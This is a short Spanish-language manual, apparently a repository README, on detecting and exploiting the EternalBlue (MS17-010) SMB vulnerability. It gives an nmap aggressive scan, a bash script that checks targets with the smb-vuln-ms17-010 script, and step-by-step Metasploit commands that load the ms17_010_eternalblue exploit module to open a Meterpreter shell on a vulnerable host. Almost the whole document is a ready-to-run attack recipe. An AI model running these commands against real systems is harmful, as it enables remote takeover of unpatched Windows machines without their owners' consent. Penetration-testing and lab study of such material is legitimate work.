# Manual-Eternalblue
Detección y explotación de la vulnerabilidad EternalBlue

La vulnerabilidad en la implementación de SMB permite a los atacantes acceder y controlar un equipo remotamente.


MANUAL:

Escaneo agresivo con nmap
Sintaxis:

```cmd
root@kali:# nmap -A "host"
```
Script para detectar si un host tiene la vulnerabilidad de eternalblue con nmap en bash:

```cmd
#!/bin/bash


echo "ingrese direccion ip del objetivo"
read ip
if nmap -p445 --script smb-vuln-ms17-010.nse $ip | grep "VULNERABLE"; then
  echo "Host es vulnerable a EternalBlue (MS17-010)"
else
  echo "Host no es vulnerable a EternalBlue (MS17-010)"
fi
```

iniciar Metasploit Framework

```cmd
root@kali:# service postgresql start
```

```cmd
root@kali:# msfconsole
```

Usar un modulo auxiliar de metasploit para detectar si un host cuenta con la vulnerabilidad de eternalblue

```cmd
msf6 > use auxiliary/scanner/smb/smb_ms17_010
```
configurar hosts

```cmd
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS "host"
```
ejecutar

```cmd
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```
Ejecutar un modulo de tipo exploit para generar una consola de meterpreter al host vulnerable

```cmd
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```
configurar host

```cmd
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS "host"
```

Ejecutar

```cmd
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```